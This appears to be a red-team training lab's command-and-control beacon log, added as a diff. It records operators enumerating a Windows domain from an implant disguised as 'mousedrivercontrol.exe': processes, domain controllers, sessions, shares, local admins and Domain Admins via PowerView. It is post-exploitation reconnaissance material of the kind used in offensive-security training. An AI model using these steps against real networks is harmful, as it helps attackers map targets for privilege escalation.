@@ -1,0 +1,896 @@
+03/30 08:13:57 UTC [metadata] 13.81.175.116 <- 10.1.3.10; computer: L-WIN223; user: w.tax; process: mousedrivercontrol.exe; pid: 4208; os: Windows; version: 6.2; beacon arch: x64 (x64)
+03/30 08:14:40 UTC [input] <MarcS> ps
+03/30 08:14:40 UTC [task] <T1057> Tasked beacon to list processes
+03/30 08:14:44 UTC [checkin] host called home, sent: 12 bytes
+03/30 08:14:44 UTC [output]
+[System Process]	0	0
+System	0	4
+Registry	4	88
+smss.exe	4	404
+csrss.exe	496	512
+wininit.exe	496	588
+csrss.exe	580	596
+winlogon.exe	580	680
+services.exe	588	688
+lsass.exe	588	728
+svchost.exe	688	836
+fontdrvhost.exe	680	844
+fontdrvhost.exe	588	852
+svchost.exe	688	920
+svchost.exe	688	972
+svchost.exe	688	1012
+LogonUI.exe	680	496
+dwm.exe	680	756
+svchost.exe	688	1040
+svchost.exe	688	1132
+svchost.exe	688	1140
+svchost.exe	688	1148
+svchost.exe	688	1156
+svchost.exe	688	1264
+svchost.exe	688	1304
+svchost.exe	688	1332
+svchost.exe	688	1368
+svchost.exe	688	1424
+svchost.exe	688	1464
+svchost.exe	688	1484
+svchost.exe	688	1620
+svchost.exe	688	1628
+svchost.exe	688	1732
+svchost.exe	688	1756
+svchost.exe	688	1772
+svchost.exe	688	1832
+taskhostw.exe	1132	1848
+svchost.exe	688	1872
+svchost.exe	688	1904
+svchost.exe	688	1924
+svchost.exe	688	2012
+svchost.exe	688	1528
+svchost.exe	688	1568
+svchost.exe	688	2052
+svchost.exe	688	2112
+svchost.exe	688	2240
+Memory Compression	4	2248
+svchost.exe	688	2284
+VSSVC.exe	688	2320
+svchost.exe	688	2384
+svchost.exe	688	2428
+svchost.exe	688	2448
+svchost.exe	688	2568
+svchost.exe	688	2656
+svchost.exe	688	2664
+svchost.exe	688	2672
+svchost.exe	688	2788
+svchost.exe	688	2796
+svchost.exe	688	2804
+svchost.exe	688	2920
+svchost.exe	688	2928
+spoolsv.exe	688	2512
+OfficeClickToRun.exe	688	3320
+sysmon64.exe	688	3328
+WaAppAgent.exe	688	3336
+WindowsAzureTelemetryService.exe	688	3344
+WindowsAzureGuestAgent.exe	688	3352
+WindowsAzureNetAgent.exe	688	3360
+svchost.exe	688	3368
+svchost.exe	688	3376
+svchost.exe	688	3384
+svchost.exe	688	3392
+svchost.exe	688	3400
+svchost.exe	688	3408
+svchost.exe	688	3416
+MsMpEng.exe	688	3424
+svchost.exe	688	3432
+svchost.exe	688	3796
+VFPlugin.exe	3360	3896
+conhost.exe	3896	3960
+unsecapp.exe	920	3236
+WmiPrvSE.exe	920	4104
+svchost.exe	688	4424
+WmiPrvSE.exe	920	4712
+svchost.exe	688	4924
+svchost.exe	688	4960
+csrss.exe	5148	5156
+winlogon.exe	5148	5200
+fontdrvhost.exe	5200	5364
+dwm.exe	5200	5436
+svchost.exe	688	5628
+rdpclip.exe	1040	5988	x64	STROOP\w.tax	2
+sihost.exe	1484	6036	x64	STROOP\w.tax	2
+svchost.exe	688	6056	x64	STROOP\w.tax	2
+svchost.exe	688	6116	x64	STROOP\w.tax	2
+taskhostw.exe	1132	5312	x64	STROOP\w.tax	2
+svchost.exe	688	5592
+svchost.exe	688	4792
+ctfmon.exe	4792	5016	x64	STROOP\w.tax	2
+explorer.exe	6212	6236	x64	STROOP\w.tax	2
+svchost.exe	688	6252
+svchost.exe	688	6424	x64	STROOP\w.tax	2
+ShellExperienceHost.exe	920	6664	x64	STROOP\w.tax	2
+svchost.exe	688	6784
+SearchUI.exe	920	6832	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	6956	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	7112	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	6712	x64	STROOP\w.tax	2
+SearchIndexer.exe	688	6708
+svchost.exe	688	7208
+svchost.exe	688	7244
+svchost.exe	688	7316
+smartscreen.exe	920	7428	x64	STROOP\w.tax	2
+SecurityHealthSystray.exe	6236	7472	x64	STROOP\w.tax	2
+SecurityHealthService.exe	688	7512
+svchost.exe	688	7780
+WaSecAgentProv.exe	3336	5764
+conhost.exe	5764	6940
+SgrmBroker.exe	688	5720
+svchost.exe	688	1720
+svchost.exe	688	1992
+svchost.exe	688	2104	x64	STROOP\w.tax	2
+WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe	920	1456	x64	STROOP\w.tax	2
+dllhost.exe	920	3028	x64	STROOP\w.tax	2
+chrome.exe	6236	4396	x64	STROOP\w.tax	2
+svchost.exe	688	4752
+chrome.exe	4396	6272	x64	STROOP\w.tax	2
+chrome.exe	4396	5484	x64	STROOP\w.tax	2
+chrome.exe	4396	7688	x64	STROOP\w.tax	2
+chrome.exe	4396	7728	x64	STROOP\w.tax	2
+chrome.exe	4396	5080	x64	STROOP\w.tax	2
+POWERPNT.EXE	6236	6440	x86	STROOP\w.tax	2
+chrome.exe	4396	800	x64	STROOP\w.tax	2
+chrome.exe	4396	152	x64	STROOP\w.tax	2
+WINWORD.EXE	2908	2212	x86	STROOP\w.tax	2
+rundll32.exe	2212	7872	x86	STROOP\w.tax	2
+MSOSYNC.EXE	6440	1644	x86	STROOP\w.tax	2
+svchost.exe	688	3724
+svchost.exe	688	3728
+SystemSettings.exe	920	7268	x64	STROOP\w.tax	2
+ApplicationFrameHost.exe	920	6520	x64	STROOP\w.tax	2
+svchost.exe	688	7640
+svchost.exe	688	4988
+svchost.exe	688	6636
+audiodg.exe	2568	4636	x64		0
+Taskmgr.exe	6236	8172	x64	STROOP\w.tax	2
+mousedrivercontrol.exe	7872	4208	x64	STROOP\w.tax	2
+
+
+03/30 08:16:47 UTC [input] <neo> net
+03/30 08:16:47 UTC [error] net error: not enough arguments
+03/30 08:17:06 UTC [input] <neo> net domain
+03/30 08:17:06 UTC [task] <> Tasked beacon to run net domain
+03/30 08:17:09 UTC [checkin] host called home, sent: 26700 bytes
+03/30 08:17:09 UTC [output]
+received output:
+stroop.local
+
+03/30 08:17:17 UTC [input] <neo> net dclist
+03/30 08:17:17 UTC [task] <T1018, T1093> Tasked beacon to run net dclist
+03/30 08:17:18 UTC [checkin] host called home, sent: 104506 bytes
+03/30 08:17:20 UTC [output]
+received output:
+DCs:
+
+
+
+03/30 08:17:35 UTC [output]
+received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 6118
+
+
+03/30 08:17:43 UTC [input] <neo> net dclist stroop.local
+03/30 08:17:43 UTC [task] <T1018, T1093> Tasked beacon to run net dclist on stroop.local
+03/30 08:17:44 UTC [checkin] host called home, sent: 104506 bytes
+03/30 08:17:45 UTC [output]
+received output:
+DCs in domain 'stroop.local':
+
+
+
+03/30 08:18:14 UTC [output]
+received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 6118
+
+
+03/30 08:18:18 UTC [input] <neo> net domain_controllers stroop.local
+03/30 08:18:18 UTC [task] <T1018, T1093> Tasked beacon to run net domain_controllers on stroop.local
+03/30 08:18:18 UTC [checkin] host called home, sent: 104518 bytes
+03/30 08:18:20 UTC [output]
+received output:
+Domain Controllers in domain 'stroop.local':
+
+ Server Name             IP Address                      
+ -----------             ----------                      
+ S-WIN22                 10.2.1.10
+ S-WIN21                 10.1.2.10
+
+
+03/30 08:18:33 UTC [input] <neo> net logons
+03/30 08:18:33 UTC [task] <T1033, T1093> Tasked beacon to run net logons on localhost
+03/30 08:18:34 UTC [checkin] host called home, sent: 104506 bytes
+03/30 08:18:36 UTC [output]
+received output:
+Logged on users at \\localhost:
+
+STROOP\W.Tax
+STROOP\W.Tax
+STROOP\L-WIN223$
+STROOP\L-WIN223$
+STROOP\L-WIN223$
+STROOP\L-WIN223$
+STROOP\L-WIN223$
+STROOP\L-WIN223$
+STROOP\L-WIN223$
+STROOP\L-WIN223$
+
+
+03/30 08:18:48 UTC [input] <neo> net logons \\s-win21
+03/30 08:18:48 UTC [task] <T1033, T1093> Tasked beacon to run net logons on s-win21
+03/30 08:18:51 UTC [checkin] host called home, sent: 104506 bytes
+03/30 08:18:53 UTC [output]
+received output:
+Logged on users at \\s-win21:
+
+[-] Error: 5
+
+
+03/30 08:19:16 UTC [input] <neo> shell net user
+03/30 08:19:16 UTC [task] <T1059> Tasked beacon to run: net user
+03/30 08:19:16 UTC [checkin] host called home, sent: 39 bytes
+03/30 08:19:17 UTC [output]
+received output:
+
+User accounts for \\L-WIN223
+
+-------------------------------------------------------------------------------
+bofh                     DefaultAccount           Guest                    
+WDAGUtilityAccount       
+The command completed successfully.
+
+
+
+03/30 08:19:27 UTC [input] <neo> shell net whoami
+03/30 08:19:27 UTC [task] <T1059> Tasked beacon to run: net whoami
+03/30 08:19:31 UTC [checkin] host called home, sent: 41 bytes
+03/30 08:19:31 UTC [output]
+received output:
+The syntax of this command is:
+
+NET
+    [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP |
+      HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START |
+      STATISTICS | STOP | TIME | USE | USER | VIEW ]
+
+
+03/30 08:19:59 UTC [input] <neo> shell net whoami /all
+03/30 08:19:59 UTC [task] <T1059> Tasked beacon to run: net whoami /all
+03/30 08:20:00 UTC [checkin] host called home, sent: 46 bytes
+03/30 08:20:00 UTC [output]
+received output:
+The syntax of this command is:
+
+NET
+    [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP |
+      HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START |
+      STATISTICS | STOP | TIME | USE | USER | VIEW ]
+
+
+03/30 08:20:04 UTC [input] <neo> shell whoami /all
+03/30 08:20:04 UTC [task] <T1059> Tasked beacon to run: whoami /all
+03/30 08:20:05 UTC [checkin] host called home, sent: 42 bytes
+03/30 08:20:05 UTC [output]
+received output:
+
+USER INFORMATION
+----------------
+
+User Name    SID                                           
+============ ==============================================
+stroop\w.tax S-1-5-21-2163199188-2306780613-1636707950-4076
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes                                        
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                     Alias            S-1-5-32-544                                   Group used for deny only                          
+BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
+STROOP\IT-webmail                          Group            S-1-5-21-2163199188-2306780613-1636707950-2716 Mandatory group, Enabled by default, Enabled group
+STROOP\SalesMarketingExt                   Group            S-1-5-21-2163199188-2306780613-1636707950-2709 Mandatory group, Enabled by default, Enabled group
+STROOP\IT-ProxyAll                         Group            S-1-5-21-2163199188-2306780613-1636707950-2714 Mandatory group, Enabled by default, Enabled group
+STROOP\All-RUS                             Group            S-1-5-21-2163199188-2306780613-1636707950-2732 Mandatory group, Enabled by default, Enabled group
+STROOP\SalesRUS                            Group            S-1-5-21-2163199188-2306780613-1636707950-2705 Mandatory group, Enabled by default, Enabled group
+STROOP\IT-MobileUsers                      Group            S-1-5-21-2163199188-2306780613-1636707950-2715 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                      
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+
+03/30 08:20:39 UTC [input] <neo> net sessions
+03/30 08:20:39 UTC [task] <T1033, T1093> Tasked beacon to run net sessions on localhost
+03/30 08:20:43 UTC [checkin] host called home, sent: 104508 bytes
+03/30 08:20:46 UTC [output]
+received output:
+Sessions for \\localhost:
+
+ Computer               User name            Active (s)     Idle (s)
+ --------               ---------            ----------     --------
+ \\[::1]                W.Tax                0              0
+
+
+03/30 08:20:52 UTC [input] <neo> net share
+03/30 08:20:52 UTC [task] <T1135, T1093> Tasked beacon to run net share on localhost
+03/30 08:20:56 UTC [checkin] host called home, sent: 104505 bytes
+03/30 08:20:58 UTC [output]
+received output:
+Shares at \\localhost:
+
+ Share name                       Comment
+ ----------                       -------
+ ADMIN$                           Remote Admin
+ C$                               Default share
+ D$                               Default share
+ IPC$                             Remote IPC
+
+
+03/30 08:21:03 UTC [input] <neo> net user
+03/30 08:21:03 UTC [task] <T1087, T1093> Tasked beacon to run net user on localhost
+03/30 08:21:07 UTC [checkin] host called home, sent: 104504 bytes
+03/30 08:21:09 UTC [output]
+received output:
+Users for \\localhost:
+
+bofh (admin)
+DefaultAccount
+Guest
+WDAGUtilityAccount
+
+
+03/30 08:21:27 UTC [input] <neo> net user \\s-win21 stroop\w.tax
+03/30 08:21:27 UTC [task] <T1087, T1093> Tasked beacon to run net user stroop\w.tax on s-win21
+03/30 08:21:28 UTC [checkin] host called home, sent: 104504 bytes
+03/30 08:21:30 UTC [output]
+received output:
+Account information for stroop\w.tax on \\s-win21:
+
+[-] Error: 2221
+
+
+03/30 08:21:33 UTC [input] <neo> net user \\s-win21 w.tax
+03/30 08:21:33 UTC [task] <T1087, T1093> Tasked beacon to run net user w.tax on s-win21
+03/30 08:21:35 UTC [checkin] host called home, sent: 104504 bytes
+03/30 08:21:37 UTC [output]
+received output:
+Account information for w.tax on \\s-win21:
+
+User name                    W.Tax
+Full Name                    
+Comment                      
+User's Comment               
+Country code                 0
+Account active               Yes
+Account expires              Never
+Account type                 User
+
+Password last set            22 hours ago
+Password expires             Yes
+Password changeable          Yes
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         
+Logon script                 
+User profile                 
+Home directory               \\S-win43\UserHome$\W.Tax
+Last logon                   03/29/2020 11:49:35
+
+
+03/30 08:22:18 UTC [input] <neo> net group \\s-win21 'domain users'
+03/30 08:22:18 UTC [task] <T1087, T1093> Tasked beacon to run net group 'domain users' on s-win21
+03/30 08:22:20 UTC [checkin] host called home, sent: 104505 bytes
+03/30 08:22:22 UTC [output]
+received output:
+Members of 'domain users' on \\s-win21:
+
+
+
+03/30 08:22:36 UTC [input] <neo> net group \\s-win21 'domain admins'
+03/30 08:22:37 UTC [task] <T1087, T1093> Tasked beacon to run net group 'domain admins' on s-win21
+03/30 08:22:41 UTC [checkin] host called home, sent: 104505 bytes
+03/30 08:22:43 UTC [output]
+received output:
+Members of 'domain admins' on \\s-win21:
+
+
+
+03/30 08:22:52 UTC [input] <neo> net view
+03/30 08:22:52 UTC [task] <T1018, T1093> Tasked beacon to run net view
+03/30 08:22:53 UTC [checkin] host called home, sent: 104504 bytes
+03/30 08:22:55 UTC [output]
+received output:
+List of hosts:
+
+
+
+03/30 08:23:08 UTC [input] <neo> net view stroop.local
+03/30 08:23:08 UTC [task] <T1018, T1093> Tasked beacon to run net view on stroop.local
+03/30 08:23:09 UTC [checkin] host called home, sent: 104504 bytes
+03/30 08:23:11 UTC [output]
+received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 6118
+
+
+03/30 08:23:11 UTC [output]
+received output:
+List of hosts for domain 'stroop.local':
+
+
+
+03/30 08:23:22 UTC [input] <neo> powershell-import
+03/30 08:23:39 UTC [task] <T1086, T1064> Tasked beacon to import: C:\Users\outflank\Desktop\Training\Lab7 - internal recon\PowerView.ps1
+03/30 08:23:39 UTC [checkin] host called home, sent: 101224 bytes
+03/30 08:23:40 UTC [output]
+received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 6118
+
+
+03/30 08:23:50 UTC [input] <neo> powershell get-netuser w.tax
+03/30 08:23:50 UTC [task] <T1086> Tasked beacon to run: get-netuser w.tax
+03/30 08:23:54 UTC [checkin] host called home, sent: 313 bytes
+03/30 08:23:56 UTC [output]
+received output:
+#< CLIXML
+
+
+logoncount            : 4
+distinguishedname     : CN=W.Tax,OU=User,OU=Accounts,DC=stroop,DC=local
+objectclass           : {top, person, organizationalPerson, user}
+lastlogontimestamp    : 3/29/2020 11:36:13 AM
+name                  : W.Tax
+objectsid             : S-1-5-21-2163199188-2306780613-1636707950-4076
+samaccountname        : W.Tax
+codepage              : 0
+homedirectory         : \\S-win43\UserHome$\W.Tax
+samaccounttype        : 805306368
+countrycode           : 0
+cn                    : W.Tax
+accountexpires        : 9223372036854775807
+whenchanged           : 3/29/2020 11:45:05 AM
+instancetype          : 4
+usncreated            : 14979
+objectguid            : 6694a63e-28cd-425c-afb4-9b218ec8d013
+objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata : 1/1/1601 12:00:00 AM
+memberof              : {CN=SalesRUS,OU=Sales,OU=Groups,DC=stroop,DC=local, 
+                        CN=SalesMarketingExt,OU=Sales,OU=Groups,DC=stroop,DC=local, 
+                        CN=All-RUS,OU=Users,OU=Groups,DC=stroop,DC=local, 
+                        CN=IT-MobileUsers,OU=IT,OU=Corp,OU=Groups,DC=stroop,DC=local...}
+lastlogon             : 3/30/2020 7:45:36 AM
+adspath               : LDAP://CN=W.Tax,OU=User,OU=Accounts,DC=stroop,DC=local
+homedrive             : H:
+useraccountcontrol    : 512
+whencreated           : 3/29/2020 10:04:19 AM
+primarygroupid        : 513
+pwdlastset            : 3/29/2020 10:04:19 AM
+usnchanged            : 31037
+
+
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+03/30 08:24:22 UTC [input] <neo> powershell get-netlocalgroup -computername l-win223
+03/30 08:24:22 UTC [task] <T1086> Tasked beacon to run: get-netlocalgroup -computername l-win223
+03/30 08:24:25 UTC [checkin] host called home, sent: 377 bytes
+03/30 08:24:29 UTC [output]
+received output:
+#< CLIXML
+
+
+ComputerName : l-win223
+AccountName  : STROOP/l-win223/bofh
+IsDomain     : False
+IsGroup      : False
+SID          : S-1-5-21-3005677839-2763426082-3693314417-500
+Description  : Built-in account for administering the computer/domain
+PwdLastSet   : 3/29/2020 2:17:30 AM
+PwdExpired   : False
+UserFlags    : 66049
+Disabled     : False
+LastLogin    : 3/30/2020 8:20:09 AM
+
+ComputerName : l-win223
+AccountName  : stroop.local/Domain Admins
+IsDomain     : True
+IsGroup      : True
+SID          : S-1-5-21-2163199188-2306780613-1636707950-512
+Description  : 
+Disabled     : 
+LastLogin    : 
+PwdLastSet   : 
+PwdExpired   : 
+UserFlags    : 
+
+ComputerName : l-win223
+AccountName  : stroop.local/svc-bsservice
+IsDomain     : True
+IsGroup      : False
+SID          : S-1-5-21-2163199188-2306780613-1636707950-4820
+Description  : 
+Disabled     : 
+LastLogin    : 3/29/2020 3:35:29 PM
+PwdLastSet   : 
+PwdExpired   : 
+UserFlags    : 
+
+ComputerName : l-win223
+AccountName  : stroop.local/W.Tax
+IsDomain     : True
+IsGroup      : False
+SID          : S-1-5-21-2163199188-2306780613-1636707950-4076
+Description  : 
+Disabled     : 
+LastLogin    : 3/30/2020 7:45:36 AM
+PwdLastSet   : 
+PwdExpired   : 
+UserFlags    : 
+
+
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+03/30 08:24:59 UTC [input] <neo> powershell get-netgroup -username w.tax
+03/30 08:24:59 UTC [task] <T1086> Tasked beacon to run: get-netgroup -username w.tax
+03/30 08:25:02 UTC [checkin] host called home, sent: 345 bytes
+03/30 08:25:04 UTC [output]
+received output:
+#< CLIXML
+STROOP\IT-MobileUsers
+STROOP\SalesRUS
+STROOP\All-RUS
+STROOP\IT-ProxyAll
+STROOP\SalesMarketingExt
+STROOP\Domain Users
+STROOP\IT-webmail
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+03/30 08:25:23 UTC [input] <neo> poweshell get-netgroupmember -groupanem "domain admins
+03/30 08:25:24 UTC [error] Unknown command: poweshell get-netgroupmember -groupanem "domain admins
+03/30 08:25:31 UTC [input] <neo> poweshell get-netgroupmember -groupname "domain admins
+03/30 08:25:31 UTC [error] Unknown command: poweshell get-netgroupmember -groupname "domain admins
+03/30 08:25:35 UTC [input] <neo> powershell get-netgroupmember -groupname "domain admins
+03/30 08:25:35 UTC [task] <T1086> Tasked beacon to run: get-netgroupmember -groupname "domain admins
+03/30 08:25:36 UTC [checkin] host called home, sent: 389 bytes
+03/30 08:25:37 UTC [output]
+received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">The string is missing the terminator: "._x000D__x000A_</S><S S="Error">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
+03/30 08:25:42 UTC [input] <neo> powershell get-netgroupmember -groupname "domain admins"
+03/30 08:25:42 UTC [task] <T1086> Tasked beacon to run: get-netgroupmember -groupname "domain admins"
+03/30 08:25:47 UTC [checkin] host called home, sent: 393 bytes
+03/30 08:25:49 UTC [output]
+received output:
+#< CLIXML
+
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : svc-linuxldap
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4819
+IsGroup      : False
+MemberDN     : CN=svc-linuxldap,OU=IT,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : svc-test
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4818
+IsGroup      : False
+MemberDN     : CN=svc-test,OU=IT,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : svc-proxy
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4816
+IsGroup      : False
+MemberDN     : CN=svc-proxy,OU=IT,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : svc-backupserver
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4814
+IsGroup      : False
+MemberDN     : CN=svc-backupserver,OU=IT,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : svc-av-control
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4812
+IsGroup      : False
+MemberDN     : CN=svc-av-control,OU=IT,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-M.vanBers
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4745
+IsGroup      : False
+MemberDN     : CN=ADMIN-M.vanBers,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-M.vanLonden
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4744
+IsGroup      : False
+MemberDN     : CN=ADMIN-M.vanLonden,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-Y.Koelen
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4743
+IsGroup      : False
+MemberDN     : CN=ADMIN-Y.Koelen,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-A.Jansen
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4742
+IsGroup      : False
+MemberDN     : CN=ADMIN-A.Jansen,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-C.Noteboom
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4741
+IsGroup      : False
+MemberDN     : CN=ADMIN-C.Noteboom,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-J.Schippers
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4740
+IsGroup      : False
+MemberDN     : CN=ADMIN-J.Schippers,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-W.Hovens
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4739
+IsGroup      : False
+MemberDN     : CN=ADMIN-W.Hovens,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-A.Henneman
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4738
+IsGroup      : False
+MemberDN     : CN=ADMIN-A.Henneman,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-R.Nijenhuis
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4737
+IsGroup      : False
+MemberDN     : CN=ADMIN-R.Nijenhuis,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-J.deBeurs
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4736
+IsGroup      : False
+MemberDN     : CN=ADMIN-J.deBeurs,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-L.vanDinther
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4735
+IsGroup      : False
+MemberDN     : CN=ADMIN-L.vanDinther,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-T.Verkroost
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4734
+IsGroup      : False
+MemberDN     : CN=ADMIN-T.Verkroost,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-K.Pleiter
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4733
+IsGroup      : False
+MemberDN     : CN=ADMIN-K.Pleiter,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-L.Okhuijsen
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4732
+IsGroup      : False
+MemberDN     : CN=ADMIN-L.Okhuijsen,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-W.Trommel
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4731
+IsGroup      : False
+MemberDN     : CN=ADMIN-W.Trommel,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-U.Kerver
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4730
+IsGroup      : False
